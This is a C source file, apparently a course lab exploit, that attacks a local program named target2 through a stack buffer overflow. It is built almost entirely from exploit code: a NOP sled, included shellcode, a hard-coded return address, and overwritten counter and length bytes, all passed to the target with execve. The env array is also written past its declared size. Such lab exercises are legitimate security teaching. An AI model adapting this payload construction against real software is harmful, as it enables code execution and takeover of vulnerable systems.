#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	
	args[0] = TARGET;
	args[2] = NULL;
int i;

	/*
	buf is 264B away from i. the rip of foo() is 280B away from buf.

	injection buffer = 283B
	shellcode = 48B
	buf = 256B
	*/
	int inj_size = 300;

	// Injection string
	char injection[inj_size];
	memset(injection, '\x00', inj_size);

	memset(injection, '\x90', 128);

	// Concatenate shellcode to inj string + padding
	strcat(injection, shellcode); 
	strcat(injection, "\x90\x90\x90"); 

	// Put NOP for the remainder (up to 252)
	memset(&injection[176], '\x90', 76);
	
	// Put the &buf for the next 4B. (Litte endian)
	strcpy(&injection[252], "\x40\xfd\x21\x20");

	// Put NOP in btw
	memset(&injection[256], '\x90', 8);

	// i and NOP
	strcpy(&injection[264], "\x0b\x01\x90\x90");

	// overflow len (283 = 0x00011b)
	strcpy(&injection[268], "\x1b\x01\x00");

	// Pack injection string into args[1]
	args[1] = injection;

	env[0] = &injection[270];
	env[1] = &injection[244];

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
